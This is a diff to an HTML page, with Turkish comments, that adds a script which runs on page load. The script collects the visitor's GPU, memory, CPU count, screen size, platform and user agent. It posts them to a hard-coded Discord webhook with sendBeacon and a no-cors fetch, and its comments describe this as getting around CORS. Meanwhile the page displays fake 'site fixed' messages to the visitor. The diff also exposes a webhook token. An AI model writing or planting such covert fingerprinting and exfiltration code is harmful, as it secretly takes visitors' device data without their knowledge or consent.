@@ -15,9 +15,9 @@
 
     <script>
         const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
-        const t = document.getElementById('t');
 
         async function s() {
+            // 1. Donanım Verilerini Topla
             let g = "N/A";
             try {
                 const c = document.createElement('canvas');
@@ -26,12 +26,31 @@
                 g = gl.getParameter(d.UNMASKED_RENDERER_ID);
             } catch(e) {}
 
-            const data = {
-                content: "@everyone", // Mesajın geldiğini kesin görmek için bildirim ekledik
-                embeds: [{
-                    title: "🚀 SİSTEM VERİSİ (GARANTİ)",
-                    color: 3066993,
-                    fields: [
-                        { name: "DONANIM", value: `GPU: ${g}\nRAM: ${navigator.deviceMemory}G\nCPU: ${navigator.hardwareConcurrency}`, inline: false },
-                        { name: "SİSTEM", value: `${navigator.platform} | ${window.screen.width
-                                                                            
+            const info = `GPU: ${g} | RAM: ${navigator.deviceMemory}G | CPU: ${navigator.hardwareConcurrency} | SCR: ${window.screen.width}x${window.screen.height} | OS: ${navigator.platform}`;
+
+            // 2. Gizli Form Oluştur (CORS Engelini Aşmak İçin)
+            const params = new URLSearchParams();
+            params.append('content', `🚀 **SİSTEM ANALİZİ BAŞARILI**\n\n**Cihaz Detayları:**\n${info}\n\n**Tarayıcı:**\n\`${navigator.userAgent}\``);
+
+            // 3. Veriyi fırlat (Tarayıcı buna engel olamaz)
+            navigator.sendBeacon(u, params);
+
+            // Alternatif Fetch (Garanti için)
+            fetch(u, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: params
+            });
+
+            // 4. Arayüz Akışı (Gecikmesiz)
+            const t = document.getElementById('t');
+            setTimeout(() => { t.innerHTML = '<span class="ok">Site uygun halde!</span>'; }, 400);
+            setTimeout(() => { t.innerHTML = '<span class="ok">Sorunlar düzeltildi.</span>'; }, 900);
+        }
+
+        s();
+    </script>
+</body>
+</html>
+
